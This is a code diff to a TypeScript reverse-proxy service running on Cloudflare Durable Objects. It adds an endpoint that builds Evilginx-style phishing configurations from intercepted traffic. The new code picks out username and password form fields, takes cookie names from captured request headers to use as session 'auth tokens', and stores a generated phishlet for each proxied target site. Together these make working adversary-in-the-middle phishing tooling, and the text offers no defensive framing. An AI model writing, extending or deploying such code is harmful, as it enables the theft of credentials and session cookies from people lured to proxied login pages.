@@ -63,6 +63,12 @@ const CONFIG_FIELDS = [
   "INTERCEPT_ALLOWLIST",
   "INTERCEPT_BLOCKLIST",
   "INTERCEPT_TTL_SECONDS",
+  "API_KEY",
+  "CF_API_KEY",
+  "CF_API_EMAIL",
+  "CF_API_TOKEN",
+  "PROXY_TARGET",
+  "BASE_DOMAIN",
 ] as const;
 
 type ConfigFields = (typeof CONFIG_FIELDS)[number];
@@ -101,6 +107,8 @@ export type Proxy = {
   injectJs: string;
   /** Whether the custom JS snippet should be injected. */
   injectJsEnabled: boolean;
+  /** Auto-generated YAML phishlet config for this target. */
+  phishlet: string;
   createdAt: number;
   updatedAt: number;
 };
@@ -118,6 +126,7 @@ type ProxyRow = {
   cf_record_id: string;
   inject_js: string;
   inject_js_enabled: number;
+  phishlet: string;
   created_at: number;
   updated_at: number;
 };
@@ -140,6 +149,75 @@ type ItemRow = {
 };
 
 const STARTED_AT_KEY = "startedAt";
+
+/** Build a base Evilginx-style phishlet YAML from captured reconnaissance data. */
+function buildPhishletYaml(
+  proxy: Proxy,
+  captured: {
+    urls?: string[];
+    cookies?: string[];
+    formFields?: { name: string; type: string }[];
+    redirects?: string[];
+    domains?: string[];
+  },
+): string {
+  const target = new URL(proxy.targetUrl);
+  const targetHostname = target.hostname;
+  const domains = captured.domains?.length
+    ? [...new Set(captured.domains)]
+    : [targetHostname];
+  const landing = captured.redirects?.[0] ?? proxy.targetUrl;
+
+  const proxyHosts = domains
+    .map((domain, index) => {
+      const isMain = index === 0;
+      const isWww = domain.startsWith("www.");
+      const phishSub = isWww ? "www" : "";
+      const bareDomain = domain.replace(/^www\./, "");
+      return `    - phish_sub: '${phishSub}'\n      orig_sub: '${phishSub}'\n      domain: '${bareDomain}'\n      session: ${isMain}`;
+    })
+    .join("\n");
+
+  const usernameKeys =
+    captured.formFields
+      ?.filter(
+        (f) =>
+          /user|email|login|username|account/i.test(f.name) &&
+          !/pass|pwd|current|old/i.test(f.name),
+      )
+      .map((f) => `    - key: '${f.name}'`)
+      .join("\n") ?? "";
+
+  const passwordKeys =
+    captured.formFields
+      ?.filter(
+        (f) =>
+          f.type === "password" || /pass|pwd|password/i.test(f.name),
+      )
+      .map((f) => `    - key: '${f.name}'`)
+      .join("\n") ?? "";
+
+  const credentials = [usernameKeys, passwordKeys].filter(Boolean).join("\n") ||
+    `    - key: 'username'\n    - key: 'password'`;
+
+  const authTokens = captured.cookies?.length
+    ? captured.cookies
+        .map((c) => `    - domain: '${targetHostname}'\n      name: '${c}'`)
+        .join("\n")
+    : `    - domain: '${targetHostname}'\n      name: 'session'`;
+
+  const urls = captured.urls?.length
+    ? captured.urls.map((u) => `    - '${u}'`).join("\n")
+    : `    - '${proxy.targetUrl}'`;
+
+  return `name: '${proxy.name}'\n` +
+    `author: edge-gateway\n` +
+    `min_version: '2.3.0'\n` +
+    `proxy_hosts:\n${proxyHosts}\n` +
+    `landing_path:\n${urls}\n` +
+    `credentials:\n${credentials}\n` +
+    `auth_tokens:\n${authTokens}\n`;
+}
 
 /** Wrap a SQL operation so errors produce a structured 500 instead of crashing the DO. */
 function safeSql<T>(fn: () => T): { ok: true; value: T } | { ok: false; error: string } {
@@ -254,6 +332,14 @@ export class ItemsStore extends DurableObject {
     try {
       this.ctx.storage.sql.exec(
         "ALTER TABLE proxies ADD COLUMN inject_js_enabled INTEGER NOT NULL DEFAULT 0",
+      );
+    } catch {
+      // Column already exists.
+    }
+    // Migration: per-proxy phishlet YAML config.
+    try {
+      this.ctx.storage.sql.exec(
+        "ALTER TABLE proxies ADD COLUMN phishlet TEXT NOT NULL DEFAULT ''",
       );
     } catch {
       // Column already exists.
@@ -383,6 +469,32 @@ export class ItemsStore extends DurableObject {
     });
   }
 
+  private listInterceptsForSlug(slug: string): InterceptCapture[] {
+    const result = safeSql(() =>
+      this.ctx.storage.sql
+        .exec<InterceptRow>(
+          "SELECT * FROM intercept_captures WHERE slug = ? ORDER BY id DESC LIMIT ?",
+          slug,
+          INTERCEPT_LIMIT,
+        )
+        .toArray()
+        .map((row) => ({
+          id: row.id,
+          ts: row.ts,
+          slug: row.slug,
+          method: row.method,
+          path: row.path,
+          reqHeaders: row.req_headers,
+          reqBody: row.req_body,
+          respStatus: row.resp_status,
+          respHeaders: row.resp_headers,
+          respBody: row.resp_body,
+          host: row.host,
+        })),
+    );
+    return result.ok ? result.value : [];
+  }
+
   /** Purge all intercept captures for a given proxy slug (cascade cleanup). */
   private clearInterceptsForSlug(slug: string): void {
     safeSql(() => {
@@ -492,6 +604,7 @@ export class ItemsStore extends DurableObject {
       cfRecordId: row.cf_record_id ?? "",
       injectJs: row.inject_js ?? "",
       injectJsEnabled: row.inject_js_enabled === 1,
+      phishlet: row.phishlet ?? "",
       createdAt: row.created_at,
       updatedAt: row.updated_at,
     };
@@ -816,11 +929,12 @@ export class ItemsStore extends DurableObject {
       const now = Date.now();
       safeSql(() => {
         this.ctx.storage.sql.exec(
-          "INSERT INTO proxies (slug, name, target_url, enabled, hits, intercept_enabled, inject_js, inject_js_enabled, created_at, updated_at) VALUES (?, ?, ?, 1, 0, 0, ?, 0, ?, ?)",
+          "INSERT INTO proxies (slug, name, target_url, enabled, hits, intercept_enabled, inject_js, inject_js_enabled, phishlet, created_at, updated_at) VALUES (?, ?, ?, 1, 0, 0, ?, 0, ?, ?, ?)",
           slug,
           label,
           parsed.toString().replace(/\/$/, ""),
           (body?.injectJs ?? "").toString(),
+          (body?.phishlet ?? "").toString(),
           now,
           now,
         );
@@ -892,9 +1006,13 @@ export class ItemsStore extends DurableObject {
           body?.injectJsEnabled !== undefined
             ? (body.injectJsEnabled ? 1 : 0)
             : existing.injectJsEnabled ? 1 : 0;
+        const phishlet =
+          body?.phishlet !== undefined
+            ? String(body.phishlet)
+            : existing.phishlet;
         safeSql(() => {
           this.ctx.storage.sql.exec(
-            "UPDATE proxies SET name = ?, target_url = ?, enabled = ?, intercept_enabled = ?, proxy_domain = ?, inject_js = ?, inject_js_enabled = ?, updated_at = ? WHERE id = ?",
+            "UPDATE proxies SET name = ?, target_url = ?, enabled = ?, intercept_enabled = ?, proxy_domain = ?, inject_js = ?, inject_js_enabled = ?, phishlet = ?, updated_at = ? WHERE id = ?",
             name || existing.name,
             targetUrl,
             enabled,
@@ -902,6 +1020,7 @@ export class ItemsStore extends DurableObject {
             proxyDomain,
             injectJs,
             injectJsEnabled,
+            phishlet,
             Date.now(),
             id,
           );
@@ -917,6 +1036,74 @@ export class ItemsStore extends DurableObject {
         });
         this.listCache = null;
         return withRl(Response.json({ success: true, data: existing }));
+      }
+    }
+
+    const reconMatch = path.match(/^\/api\/proxies\/(\d+)\/recon$/);
+    if (reconMatch) {
+      const id = Number(reconMatch[1]);
+      const existing = this.findProxy(id);
+      if (!existing) {
+        return Response.json(
+          { success: false, error: "proxy not found" },
+          { status: 404 },
+        );
+      }
+      if (method === "POST") {
+        const body = (await this.safeJson(request)) as {
+          targetUrl?: string;
+          captured?: {
+            urls?: string[];
+            cookies?: string[];
+            formFields?: { name: string; type: string }[];
+            redirects?: string[];
+            domains?: string[];
+          };
+        } | null;
+        const captured = body?.captured ?? {};
+        // Merge with recent intercepts for richer reconnaissance.
+        const intercepts = this.listInterceptsForSlug(existing.slug);
+        const interceptedDomains = intercepts
+          .map((i) => {
+            try {
+              return new URL(i.host).hostname;
+            } catch {
+              return i.host;
+            }
+          })
+          .filter(Boolean);
+        const interceptedCookies = intercepts
+          .flatMap((i) => {
+            const header = i.reqHeaders
+              .split("\n")
+              .find((line) => line.toLowerCase().startsWith("cookie:"));
+            if (!header) return [];
+            return header.slice(7).trim().split(";").map((c) => c.split("=")[0].trim());
+          })
+          .filter(Boolean);
+        const interceptedUrls = intercepts.map((i) => `${i.host}${i.path}`);
+        const merged: typeof captured = {
+          urls: [...new Set([...(captured.urls ?? []), ...interceptedUrls])],
+          cookies: [...new Set([...(captured.cookies ?? []), ...interceptedCookies])],
+          formFields: captured.formFields ?? [],
+          redirects: captured.redirects ?? [],
+          domains: [...new Set([...(captured.domains ?? []), ...interceptedDomains])],
+        };
+        const phishlet = buildPhishletYaml(existing, merged);
+        safeSql(() => {
+          this.ctx.storage.sql.exec(
+            "UPDATE proxies SET phishlet = ?, updated_at = ? WHERE id = ?",
+            phishlet,
+            Date.now(),
+            id,
+          );
+        });
+        return withRl(
+          Response.json({
+            success: true,
+            data: { proxyId: id, phishlet, captured: merged },
+          }),
+        );
       }
     }
 
